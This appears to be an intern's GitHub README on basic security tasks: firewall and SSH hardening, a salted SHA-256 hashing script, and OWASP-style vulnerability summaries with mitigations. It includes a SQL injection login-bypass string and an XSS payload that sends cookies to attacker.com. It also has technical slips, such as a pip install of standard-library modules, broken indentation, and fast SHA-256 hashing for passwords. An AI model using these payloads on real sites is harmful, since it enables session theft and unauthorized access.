# Cybersecurity Internship - Week 1 Assessment

**Submitted by:** Kamran Manzoor  
**Company:** DevelopersHub Corporation  
**Internship Program:** Cybersecurity Internship  
**Date:** Nov 17, 2024  

## Introduction
This repository contains my Week 1 tasks completed as part of the Cybersecurity Internship at DevelopersHub Corporation. The tasks were focused on understanding fundamental cybersecurity concepts, network security, password hashing, and performing security testing with various tools including Burp Suite.

---

## Installation

1. **VMware Installation:**
   - VMware was set up as the primary virtual machine platform.
   - Kali Linux, a penetration testing and security analysis distribution, was installed.
     ![image](https://github.com/user-attachments/assets/38b319f4-4c6f-4c70-a264-1b66b211c5b4)
     ![image](https://github.com/user-attachments/assets/735e276f-3307-4025-9f04-570d970515a9)



2. **Wireshark Installation:**
   - Installed on Kali Linux for network traffic analysis.

3. **Python Dependencies:**
   - Ensure Python 3.x is installed to run the Python scripts.
   - `pip install hashlib os`

---

## Linux Commands Used

- **Wireshark Installation:**
  ```bash
  sudo apt update
  sudo apt install wireshark
  
- **WPython Dependencies:**
  ```bash
  pip install hashlib os

- **UFW Firewall Configuration:**
  ```bash
  sudo ufw enable
  sudo ufw allow ssh
  sudo ufw allow 80/tcp

![image](https://github.com/user-attachments/assets/4473afcf-6c03-419e-9493-60266b801dd7)
![image](https://github.com/user-attachments/assets/c8ef3563-2c52-4643-9292-6e1de1c9cc0a)

- **Disabling Root Login via SSH**
- To improve SSH security, disable root login:
- Edit SSH configuration:
  ```bash
  sudo nano /etc/ssh/sshd_config
- Set PermitRootLogin to no, then restart SSH:
  ```bash
  sudo systemctl restart sshd
- **Packet Capture with Wireshark**
- To capture network traffic, run Wireshark with root privileges:
  ```bash
  sudo wireshark
![image](https://github.com/user-attachments/assets/86d9b55f-420e-4450-891a-76c0009e9533)

---

## Python Code: Password Hashing and Salting
- The following Python script demonstrates password hashing using SHA-256 with a random salt.
  ```python
  import hashlib
  import os  # For generating a random salt

    def hashing_method(passwd_hash, salt):
    # Combine the password with the salt and hash the result
    salted_passwd = passwd_hash + salt
    hash1 = hashlib.sha256(salted_passwd.encode())  # Using SHA-256 hashing
    print('Your salted and hashed password is:', hash1.hexdigest())

    def main():
    print('Password hashing script with salting')
    passwd_hash = input('Enter password to hash: ')  # Get password from user

    # Generate a random salt (16 bytes)
    salt = os.urandom(16).hex()  # Convert random bytes to a hex string

    # Print the salt (to simulate storing it in a database)
    print('Salt used:', salt)

    # Call hashing method with password and salt
    hashing_method(passwd_hash, salt)

    if __name__ == '__main__':
    main()

**Description:**
- Salting: A random salt is generated and added to the password before hashing. This process ensures that even if two users have the same password, their hashes will be different due to 
unique salts.
- Hashing: SHA-256 is used to hash the salted password, making it computationally infeasible to reverse the hash.
![image](https://github.com/user-attachments/assets/8b8259e7-c632-4a5f-8fe3-8d604e903911)

## 1. Injection (e.g., SQL Injection)

**Summary:**
- Injection flaws occur when an attacker sends untrusted data into a web application, which is then interpreted as part of a command or query. SQL injection is one of the most common forms of injection attacks and can allow attackers to manipulate queries to interact with a database in unintended ways.

**Exploitation Example:**
- If an application does not properly sanitize user input, an attacker can inject malicious data into SQL queries, potentially gaining unauthorized access to sensitive data, deleting records, or performing actions as an administrator.
  ![image](https://github.com/user-attachments/assets/eab14d82-3984-4f4b-8346-bac99a8160dc)
  ![image](https://github.com/user-attachments/assets/f7f0ec4f-06ce-4764-8676-e1ce50ffe8ec)
  ![image](https://github.com/user-attachments/assets/bcb0f93b-50cb-4c16-926b-010acbced4c9)
  ![image](https://github.com/user-attachments/assets/3048cefe-0ff5-4c1d-a4e4-4368b634edbb)

- **Example SQL Code:**
  ```sql
  SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
- This SQL query bypasses authentication by exploiting the logic flaw where the condition '1'='1' is always true, granting unauthorized access to the application.
- **Mitigation:**
- Use prepared statements and parameterized queries to safely handle user input and prevent injection attacks.
- Implement strict input validation and sanitize inputs to ensure that they do not contain harmful characters or commands.
- Regularly test the application for SQL injection vulnerabilities using tools like Burp Suite or manual testing.
---

## 2. Broken Authentication

**Summary:**
- Broken authentication occurs when an attacker is able to compromise authentication mechanisms such as login credentials or session tokens, allowing unauthorized access to sensitive data or services.

**Exploitation Example:**
- Attackers can use brute force to guess weak passwords or exploit a poorly implemented session management system to hijack valid user sessions.
- **Example:** If a session token is not properly invalidated after logout, an attacker could reuse the token to gain access.
  ![image](https://github.com/user-attachments/assets/423c1ec3-eb3c-474a-96de-1a499394707e)
  ![image](https://github.com/user-attachments/assets/66534a98-c6fe-4714-8735-ad7197c12be2)



**Mitigation:**
- Ensure session tokens are invalidated properly upon logout.
- Implement multi-factor authentication (MFA) to add an additional layer of security.
- Use secure session management practices, such as setting session timeouts and ensuring tokens are encrypted.

---

  ## 3. Sensitive Data Exposure

**Summary:**
- Sensitive data exposure happens when web applications fail to adequately protect sensitive information, like passwords, credit card numbers, or personal details. This could be due to weak encryption, poor key management, or using outdated protocols.

**Exploitation Example:**
- An attacker can intercept data in transit if a website does not use HTTPS or uses weak encryption algorithms.
- **Example:** Without encryption, an attacker could intercept a login form's username and password transmitted over HTTP. This would allow them to easily steal user credentials.
  ![image](https://github.com/user-attachments/assets/e84d267d-4079-4509-8711-bfaf10f4a894)
  ![image](https://github.com/user-attachments/assets/8f3f1e03-2667-45e5-854a-37d85f8ba37e)



**Mitigation:**
- Always use HTTPS (SSL/TLS) to encrypt data transmitted over the network.
- Implement strong encryption algorithms (e.g., AES-256) for sensitive data storage.
- Use proper key management practices and periodically rotate keys.
- Avoid using outdated or vulnerable encryption protocols like SSL 2.0 or 3.0.

---
## 4. Broken Access Control

**Summary:**
- Broken access control occurs when an application allows users to access resources or perform actions that should be restricted. This happens when an application does not properly enforce user permissions or relies on weak access control mechanisms.

**Exploitation Example:**
- As demonstrated in the script you shared, an attacker can modify hidden fields (such as `user_id`) in the HTML form to submit data under another user’s name, potentially impersonating them.
- **Example:** This could allow an attacker to post feedback under an admin’s name or access other users' sensitive information.
  ![image](https://github.com/user-attachments/assets/21a56156-6bf8-4e56-9a27-df95f6ff198b)
  ![image](https://github.com/user-attachments/assets/bf843c73-a0c2-4533-99bf-345bd4cc6d9e)



**Mitigation:**
- Implement proper access controls that enforce restrictions based on user roles or privileges.
- Ensure that all actions, including those on hidden fields, are verified on the server-side, and not just through client-side checks.
- Use access control lists (ACLs) or role-based access control (RBAC) to restrict actions and resources to authorized users only.

---

## 5. Cross-Site Scripting (XSS)

**Summary:**
- XSS vulnerabilities occur when an attacker is able to inject malicious scripts into web pages that are viewed by other users. These scripts can be executed in the context of the victim's browser and may lead to the theft of session cookies, redirection to malicious websites, or actions being performed on behalf of the victim without their consent.

**Exploitation Example:**
- An attacker could inject a malicious script into a comment section or input field of a website that executes when another user views the page.
- **Example Script:**
  ```javascript
  <script>document.location='http://attacker.com/steal_cookie?cookie='+document.cookie;</script>
![image](https://github.com/user-attachments/assets/7d046faf-0300-4c18-8cd9-17210f0c5967)
![image](https://github.com/user-attachments/assets/2b6bffc7-24a7-444f-978f-698007591468)


---








